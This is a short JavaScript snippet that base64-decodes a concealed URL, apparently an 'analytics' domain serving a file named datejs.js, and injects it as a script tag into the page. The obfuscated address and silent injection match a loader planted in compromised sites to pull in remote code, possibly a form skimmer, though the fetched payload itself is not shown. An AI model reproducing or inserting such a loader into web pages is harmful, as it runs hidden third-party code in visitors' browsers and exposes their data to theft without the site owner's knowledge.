var string = 'aHR0cHM6Ly9hbmFseXRpY3Muc2hvcHN0YXQxLmNvbS9kYXRlanMuanM=';
var decodedString = atob(string);
var js = document.createElement('script');
js.src = ''+ decodedString +'';
var first = document.getElementsByTagName('script')[1];
first.parentNode.insertBefore(js, first);
